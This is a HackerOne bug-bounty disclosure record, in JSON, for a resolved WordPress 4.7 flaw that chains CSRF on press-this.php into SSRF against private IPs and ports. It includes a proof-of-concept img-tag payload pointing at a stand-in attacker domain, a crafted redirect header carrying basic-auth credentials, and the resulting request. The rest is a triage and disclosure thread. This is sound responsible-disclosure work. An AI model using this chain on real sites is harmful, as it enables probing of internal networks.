{"id":187520,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODc1MjA=","url":"https://hackerone.com/reports/187520","title":"Wordpress 4.7 - CSRF -\u003e HTTP SSRF any private ip:port and basic-auth","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-12-01T23:02:27.537Z","submitted_at":"2016-12-01T23:02:27.537Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skansing","url":"/skansing","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-20T09:59:51.248Z","bug_reporter_agreed_on_going_public_at":"2017-10-21T09:59:50.518Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Description\nThis report is a variant on report #110801 but with broader vector.\n#110801 was a XSRF SSRF that allowd unintended GET requests to 0.0.0.0 on port 80, 443 and 8080.\n\nThis vulnerability uses same entry vector of the `press this` scrape function but entirely bypasses the ip and port filter allowing the SSRF to any ip, port and appending basic-auth headers.\n\nThe ip:port bypass is made by forging a CSRF to `wp-admin/press-this.php?u=http://[HOST|IP]` with a **valid** hostname/ip. The valid host will then reply with a crafted header targeting `location: http://[privateip]:[port]` like *192.168.01, 127.0.01:11211 ..* resulting in the final SSRF. The redirect can also include a basic-auth which the server adds as a **Authorization** header.\n\n#PoC\nThe PoC is very similar to #110801 but with a addition of a valid domain which replies with a redirection header and http code.\n\nVictim has privileges to use press-this of example.com\n\n- Victim has a session running\n- Victim gets a payload similar to `\u003cimg src=\"//example.com/wp-admin/press-this.php?u=http://attackers-domain.com\u0026url-scan-submit=Scan\" /\u003e\n- Victim sends a scrape request to attackers-domain.com\n- Attackers domain replies with a 302 and a location header \n```\nLocation: http://192.168.0.1:12345\n```\n- Server blindly follows redirect and the internal ip gets hit.\n\nThis can be escalated by adding a basic auth scheme to the redirect url as\n```\nLocation: http://admin:admin@192.168.0.1:12345\n```\n\nListening to the SSRF on 192.168.0.1 would yield a incoming HTTP from the victims server carrying a basic-auth header crafted towards the internal endpoint.\n```\nGET / HTTP/1.1\nHost: 192.168.0.1:12345\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Press This (WordPress/4.7-RC1);\nAccept: */*\nAccept-Encoding: deflate, gzip\nReferer: http://admin:admin@192.168.0.1:12345/\nConnection: close\n```\n\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-11-20T09:59:50.586Z","allow_singular_disclosure_after":-122788607.89763986,"singular_disclosure_allowed":true,"vote_count":20,"voters":["jensec","003random","skansing","eveeez","cr4xerbik4sh","g-o","japz","spetr0x","visi0n","praveenbhuvi2328","and 10 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1340229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, we're investigating the issue.","automated_response":false,"created_at":"2016-12-04T20:11:26.991Z","updated_at":"2016-12-04T20:11:26.991Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1344711,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I can confirm that this is a regression that was introduced a few months ago (good catch!) and we're currently testing a patch which should fix the issue.  How would you like to be credited in the release notes once this has been resolved, [Ronni Skansing](https://dk.linkedin.com/in/ronni-skansing-36143b65) as before?\n\nAdditionally, in case HackerOne didn't automatically send an invitation when this report was moved, you should now be able to submit reports such as this directly to the WordPress bug bounty program at https://hackerone.com/wordpress (which is still currently private, but where this report has now been moved) instead of https://hackerone.com/automattic.\n","automated_response":false,"created_at":"2016-12-06T18:01:53.381Z","updated_at":"2016-12-06T18:01:53.381Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1345032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the fast feedback. I will make sure to put it in the right place next time =)\n\nIf you would credit it as before that would be great, thanks. btw. do you know if #131522 made it in 4.7?","automated_response":false,"created_at":"2016-12-06T19:32:43.340Z","updated_at":"2016-12-06T19:33:34.670Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1414527,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I dont see this mentioned in 4.7.1 release https://wordpress.org/news/\nSo I am guessing it didnt make the cut\n\nWill it be fixed in 4.7.2?","automated_response":false,"created_at":"2017-01-11T20:21:42.971Z","updated_at":"2017-01-11T20:21:42.971Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1447438,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@skansing, thank you for your patience as we've worked on this issue. While the fix wasn't included in 4.7.2 release today, please be assured that we are working towards resolving this issue. Again, thank you for your patience.","automated_response":false,"created_at":"2017-01-27T05:11:18.695Z","updated_at":"2017-01-27T05:11:18.695Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@voldemortensen hi, thanks for updating me on the situation.\n\nIt did surprise me that this was not been fixed in 4.7.1 nor 4.7.2, based upon the intial response where a patch was already under test and a regression into account, but I am crossing fingers it gets fixed soon.\n\nAtm this program is private which means I can not disclose this when the bug is fixed and released. I am in doubt if you want public disclosure on the report when it is released?\n\nAlso why does Wordpress have a open (automattic) and this private program, should previous reports afflicting wp also be moved from the open to this program, like #119529? ","automated_response":false,"created_at":"2017-02-02T19:00:10.077Z","updated_at":"2017-02-02T19:01:19.724Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1459361,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skansing,\n\nI'll leave it to one of the others that has worked on this to give you an update on progress on the patch, but I wanted to address your questions about disclosure and our H1.\n\nWe are launching this new HackerOne for the WordPress open source project and migrating it off of Automattic's. The process is taking a little while as we get our team up to speed, but the plan is to make this public as soon as we're ready. I'll have someone look into #119529 for you and see if it needs to be migrated here as well.\n\nAs for disclosure, I'm happy to work with you on a disclosure schedule whenever this is closed, even if the program is still private at that time.","automated_response":false,"created_at":"2017-02-02T20:01:35.362Z","updated_at":"2017-02-02T20:01:35.362Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459439,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@aaroncampbell thanks for the awesome fast and for full response.  It is appreciated. ","automated_response":false,"created_at":"2017-02-02T20:39:17.518Z","updated_at":"2017-02-02T20:40:09.285Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1522844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, I see this was not mentioned in the 4.7.3 release, so I am guessing it has not been fixed?\n\n3 months seems to long for a CSRF=\u003eSSRF in wp?","automated_response":false,"created_at":"2017-03-06T20:42:38.605Z","updated_at":"2017-03-06T20:43:35.903Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1679825,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, this has been released in 4.7.5\n\nCan we remove the noisy comments (all of them except the first two) or make a summary and make this report public?","automated_response":false,"created_at":"2017-05-17T11:39:52.104Z","updated_at":"2017-05-17T11:39:52.104Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1696656,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Yes, this was fixed in WordPress 4.7.5. A bounty will be assigned soon. Once those are done we can get this ready to make public.","automated_response":false,"created_at":"2017-05-24T00:09:16.973Z","updated_at":"2017-05-24T00:09:16.973Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skansing","url":"/skansing"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1763595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I would like to request public disclosure on this report, but would like limit it to the report. I think the comments are noisy and not in the benefit of any reader.","automated_response":false,"created_at":"2017-06-17T23:55:24.916Z","updated_at":"2017-06-17T23:55:24.916Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1766501,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-06-19T20:20:30.339Z","updated_at":"2017-06-19T20:20:30.339Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"bounty_amount":"700.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"skansing","url":"/skansing"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2091361,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I forgot to request public disclosure. I am fine with both full and partial disclosure (see comment above)","automated_response":false,"created_at":"2017-10-21T09:59:50.547Z","updated_at":"2017-10-21T09:59:50.547Z","first_to_agree":true,"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2169400,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-20T09:59:51.297Z","updated_at":"2017-11-20T09:59:51.297Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}